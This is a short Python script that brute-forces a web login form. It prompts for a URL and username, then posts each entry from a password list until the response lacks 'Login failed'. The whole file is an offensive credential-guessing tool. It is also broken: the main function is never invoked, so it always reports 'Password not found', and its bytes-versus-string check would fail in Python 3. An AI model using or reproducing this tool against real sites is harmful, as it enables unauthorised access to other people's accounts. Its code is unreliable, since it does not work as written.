#!/usr/bin/python

import requests

url = input("Enter url : ")
username = input("Enter username: ")

def crack(username,url,passwords):
	for password in passwords:
		password = password.strip()
		print("Trying: "+password)
		data_dict = {"username":username,"password":password,"Login":"submit"}
		response = requests.post(url,data=data_dict)
		if "Login failed" in response.content:
			pass
		else:
			print("Username: ==> "+username)
			print("Password: ==> "+password)
			exit()

def main():
	with open("passwords.txt",'r') as passwords:
		passwds =  passwords.readlines()
		crack(username,url,passwds)

if __name__ == "__main__":
    	pass

print("[!!] Password not found")
